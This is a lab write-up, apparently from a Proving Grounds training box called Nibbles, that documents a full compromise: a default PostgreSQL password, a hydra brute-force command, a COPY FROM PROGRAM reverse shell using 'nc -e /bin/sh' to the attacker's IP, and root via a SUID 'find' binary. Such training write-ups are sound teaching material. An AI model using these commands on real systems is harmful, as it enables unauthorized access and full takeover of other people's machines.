---
layout: post
title: PG | Nibbles
subtitle: This machine will highlight why we have hardening guidelines.
---

# Nmap Scan Results

~~~
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 09:34 UTC
Nmap scan report for 192.168.191.47
Host is up (0.014s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.81 seconds
~~~

# Service Enumeration

## HTTP (TCP/80)
The target machine is running an Apache web server on port 80

![Nibbles](/assets/img/NibblesPG(1).png)

After digging around the contents of the website and running a gobuster sub-directory scan there was no significant entry point for a foothold

![Nibbles](/assets/img/NibblesPG(2).png)

## PostgreSQL (TCP/5437)

PostgreSQL is a relational database management system software commonly used on Unix systems.

I first attempted to connect to postgres using the default username of "postgres" and a null password, however it prompted for password authentication

~~~shell
┌──(kali㉿kali)-[~/Desktop/Nibbles]
└─$ psql -h 192.168.191.47 -U postgres -p 5437
Password for user postgres: 
psql: error: connection to server at "192.168.191.47", port 5437 failed: fe_sendauth: no password supplied
~~~

I then attempted a few manual password attempts of "password" and "postgres", and postgres was the password!

~~~shell
┌──(kali㉿kali)-[~/Desktop/Nibbles]
└─$ psql -h 192.168.191.47 -U postgres -p 5437
Password for user postgres: 
psql (16.0 (Debian 16.0-2), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# 

~~~

I then enumerated the available databases using "\l" cmdlet and listed our user's privileges via "\du+" which showed we have Superuser privileges

~~~shell
┌──(kali㉿kali)-[~/Desktop/Nibbles]
└─$ psql -h 192.168.191.47 -U postgres -p 5437
Password for user postgres: 
psql (16.0 (Debian 16.0-2), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                       List of databases
   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
           |          |          |                 |             |             |            |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
           |          |          |                 |             |             |            |           | postgres=CTc/postgres
(3 rows)

postgres=# \du+
                                    List of roles
 Role name |                         Attributes                         | Description 
-----------+------------------------------------------------------------+-------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | 
~~~

After researching and with the help of [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) I found a way to read directories and files by creating a database table and populating it with data on the targets local filesystem, which identified a user on the system named 'wilson'

![Nibbles](/assets/img/NibblesPG(3).png)

I then ran a hydra password brute force attempt on the wilson user account through the FTP service, but had no success so decided to dig deeper into what Superusers can do.
~~~shell
┌──(kali㉿kali)-[/usr/share/seclists/Passwords/Common-Credentials]
└─$ hydra -l wilson -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ftp://192.168.191.47
~~~

I found a [RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) exploit that works for Superusers on PostgreSQL version 9.3+ and used it to execute a reverse shell

Create listener on port 80

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 80
listening on [any] 80 ...
~~~

Perform RCE
~~~shell
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'nc -e /bin/sh 192.168.45.173 80';
~~~

And we recieved our reverse shell foothold!
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.173] from (UNKNOWN) [192.168.191.47] 42184

whoami
postgres
~~~

I ran a scan using linpeas.sh which identified the "find" binary has the SUID bit set, which can be used to elevate privileges through the -exec option of the find cmdlet as discussed in [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) list of binaries and bypasses
~~~shell
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found                                                                                                                                                            
strace Not Found                              
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
~~~

Executing the PrivEsc
~~~shell
$ find . -exec /bin/sh -p \; -quit
# whoami
root
~~~
